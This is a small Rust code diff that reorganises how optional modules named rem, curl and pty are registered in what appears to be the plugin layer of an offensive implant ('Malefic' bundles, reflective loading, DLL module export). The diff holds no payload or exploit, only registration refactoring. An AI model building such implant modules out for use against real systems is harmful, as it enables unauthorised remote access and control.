@@ -9,11 +9,8 @@ mod curl;
 #[cfg(feature = "pty")]
 mod pty;
 
-#[cfg(feature = "hook")]
-mod hook;
-
-use std::collections::HashMap;
 use prelude::*;
+use std::collections::HashMap;
 
 pub extern "C" fn register_3rd() -> MaleficBundle {
     let mut map: MaleficBundle = HashMap::new();
@@ -23,21 +20,19 @@ pub extern "C" fn register_3rd() -> MaleficBundle {
         register_module!(map, "memory_dial", rem::MemoryDial);
     }
 
-    // #[cfg(feature = "rem_reflection")]
-    // register_module!(map, "load_rem", rem::LoadRem);
-
     #[cfg(feature = "curl")]
     register_module!(map, "curl", curl::Curl);
 
     #[cfg(feature = "pty")]
     register_module!(map, "pty", pty::Pty);
-    
+
     map
 }
 
-#[cfg(feature = "as_cdylib")]
-#[no_mangle]
-#[allow(improper_ctypes_definitions)]
-pub extern "C" fn register_modules() -> MaleficBundle {
-    register_3rd()
-}
+#[cfg(feature = "as_module_dll")]
+malefic_module::register_rt_modules!(
+    #[cfg(feature = "rem")] rem::RemDial,
+    #[cfg(feature = "rem")] rem::MemoryDial,
+    #[cfg(feature = "curl")] curl::Curl,
+    #[cfg(feature = "pty")] pty::Pty
+);
